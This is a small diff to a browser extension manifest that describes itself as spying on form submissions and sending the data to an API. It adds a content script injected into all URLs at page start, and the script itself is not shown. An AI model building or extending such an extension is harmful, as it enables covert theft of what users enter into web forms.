@@ -5,5 +5,16 @@
     "description": "Browser Extension that spies on Form Submission and sends Data to a specified API",
     "host_permissions": [
         "<all_urls>"
+    ],
+    "content_scripts": [
+        {
+            "matches": [
+                "<all_urls>"
+            ],
+            "js": [
+                "content/index.js"
+            ],
+            "run_at": "document_start"
+        }
     ]
 }
